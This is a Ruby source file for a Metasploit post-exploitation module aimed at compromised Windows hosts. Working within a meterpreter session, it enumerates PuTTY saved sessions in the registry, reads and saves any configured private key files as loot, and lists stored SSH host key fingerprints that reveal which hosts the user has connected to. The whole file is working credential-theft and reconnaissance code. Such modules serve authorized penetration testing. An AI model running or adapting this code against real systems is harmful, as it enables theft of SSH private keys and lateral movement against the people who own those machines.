##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  INTERESTING_KEYS=['HostName','PublicKeyFile','UserName','PortNumber','PortForwardings']
  def initialize(info={})
    super(update_info(info,
      'Name'            => "PuTTY Saved Sessions Enumeration Module",
      'Description'     => %q{
        This module will identify whether Pageant (PuTTY Agent) is running and obtain saved session
        information from the registry. PuTTY is very configurable; some users may have configured
        saved sessions which could include a username, private key file to use when authenticating,
        host name etc.

        If a private key is configured, an attempt will be made to download and store it in loot.
       },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>']
    ))
  end

  def get_saved_session_details(sessions)

    all_sessions = []
    sessions.each do |ses|
        newses = {}
        newses['Name'] = Rex::Text.uri_decode(ses)
        INTERESTING_KEYS.each do |key|
            newses[key] = registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\#{ses}", key).to_s
        end
        all_sessions << newses
    end 
    all_sessions
  end

  def display_saved_sessions_report(info)

    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
      'Header'     => "PuTTY Saved Sessions",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => ['Name'].append(INTERESTING_KEYS).flatten
    )

    info.each do |result|
      row = []
      row << result['Name']
      INTERESTING_KEYS.each do |key|
        row << result[key]
      end  
      results_table << row
    end

    print_line results_table.to_s
  end

  def get_stored_host_key_details(allkeys)

    # This hash will store (as the key) host:port pairs. This is basically a quick way of
    # getting a unique list of host:port pairs.
    all_ssh_host_keys = {}

    # This regex will split up lines such as rsa2@22:127.0.0.1 from the registry.
    rx_split_hostporttype = %r{^(?<type>[-a-z0-9]+?)@(?<port>[0-9]+?):(?<host>.+)$}i

    # Go through each of the stored keys found in the registry
    allkeys.each do |key|

        # Store the raw key and value in a hash to start off with
        newkey = {
          rawname: key,
          rawsig: registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys", key).to_s
        }

        # Take the key and split up host, port and fingerprint type. If it matches, store the information
        # in the hash for later.
        split_hostporttype = rx_split_hostporttype.match(key.to_s)
        if split_hostporttype

            # Extract the host, port and key type into the hash
            newkey['host'] = split_hostporttype[:host]
            newkey['port'] = split_hostporttype[:port]
            newkey['type'] = split_hostporttype[:type]

            # Form the key 
            host_port = "#{newkey['host']}:#{newkey['port']}"

            # Add it to the consolidation hash. If the same IP has different key types, append to the array
            all_ssh_host_keys[host_port] = [] if all_ssh_host_keys[host_port].nil?
            all_ssh_host_keys[host_port] << newkey['type']
        end
    end 
    all_ssh_host_keys
  end

  def display_stored_host_keys_report(info)

    # Results table holds raw string data
    results_table = Rex::Ui::Text::Table.new(
      'Header'     => "Stored SSH host key fingerprints",
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => ['SSH Endpoint', 'Key Type(s)']
    )

    info.each do |key,result|
      row = []
      row << key
      row << result.join(', ')
      results_table << row
    end

    print_line results_table.to_s
  end

  def grab_private_keys(sessions)
    sessions.each do |ses|

        filename = ses['PublicKeyFile'].to_s
        next if filename.empty?

        # Check whether the file exists.
        if file?(filename)
           if ppk = read_file(filename) # Attempt to read the contents of the file
                stored_path = store_loot('putty.ppk.file', 'application/octet-stream', session, ppk)
                print_status("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
           else
                print_error("Unable to read PuTTY private key file for \'#{ses['Name']}\' (#{filename})") # May be that we do not have permissions etc
           end
        else
           print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be found.")
        end
    end
  end

  
  # Entry point
  def run

    # Look for saved sessions, break out if not.
    print_status("Looking for saved PuTTY sessions")
    saved_sessions = registry_enumkeys('HKCU\\Software\\SimonTatham\\PuTTY\\Sessions')
    if saved_sessions.nil? || saved_sessions.empty?
        print_error('No saved sessions found')
    else

	    # Tell the user how many sessions have been found (with correct English)
	    print_status("Found #{saved_sessions.count} session#{saved_sessions.count>1?'s':''}") 
	
	    # Retrieve the saved session details & print them to the screen in a report
	    all_saved_sessions = get_saved_session_details(saved_sessions)
	    display_saved_sessions_report(all_saved_sessions)
    	print_status("Session data also stored in notes. Use 'notes -t putty.savedsessions to view'.")
	
	    # If the private key file has been configured, retrieve it and save it to loot
	    print_status("Downloading private keys...")
	    grab_private_keys(all_saved_sessions)

    end

    # Now search for SSH stored keys. These could be useful because it shows hosts that the user
    # has previously connected to and accepted a key from. 
    print_status("Looking for previously stored SSH host key fingerprints")
    stored_ssh_host_keys = registry_enumvals('HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys')
    if stored_ssh_host_keys.nil? || stored_ssh_host_keys.empty?
        print_error('No stored SSH host keys found')
    else
	    # Tell the user how many sessions have been found (with correct English)
	    print_status("Found #{stored_ssh_host_keys.count} stored key fingerprint#{stored_ssh_host_keys.count>1?'s':''}") 

	    # Retrieve the saved session details & print them to the screen in a report
	    print_status("Downloading stored key fingerprints...")
	    all_stored_keys = get_stored_host_key_details(stored_ssh_host_keys)
        if all_stored_keys.nil? || all_stored_keys.empty?
            print_error("No stored key fingerprints found")
        else
    	    print_status("Unique host:port pairs are shown in the table below. All other details, including the actual fingerprint, are stored in notes. Use 'notes -t putty.storedhostfp to view'.")
            display_stored_host_keys_report(all_stored_keys) 
        end
    end

  end

end
